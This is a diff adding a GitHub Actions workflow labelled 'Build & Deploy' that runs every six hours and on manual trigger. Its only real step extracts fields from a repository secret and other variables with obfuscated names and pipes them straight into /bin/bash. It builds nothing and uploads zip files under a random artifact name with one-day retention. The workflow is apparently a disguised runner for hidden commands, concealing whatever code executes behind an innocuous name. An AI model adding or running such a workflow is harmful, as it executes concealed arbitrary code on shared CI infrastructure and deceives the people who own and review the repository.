@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          xw154: ${{ secrets.xw154 }}
+        run: |
+          printf '%s' "$xw154" | jq -r .gebnl469 | /bin/bash
+          printf '%s' "$a772" | jq -r .wluxk595 | /bin/bash
+          echo $xkcf4523 | jq -r .dh100 | /bin/bash
+          echo $oflk8 | jq -r .sxpa91689 | /bin/bash
+          echo $gggx65 | jq -r .ecdx75 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: RJ4rtY7Q
+          path: "*.zip"
+          retention-days: 1
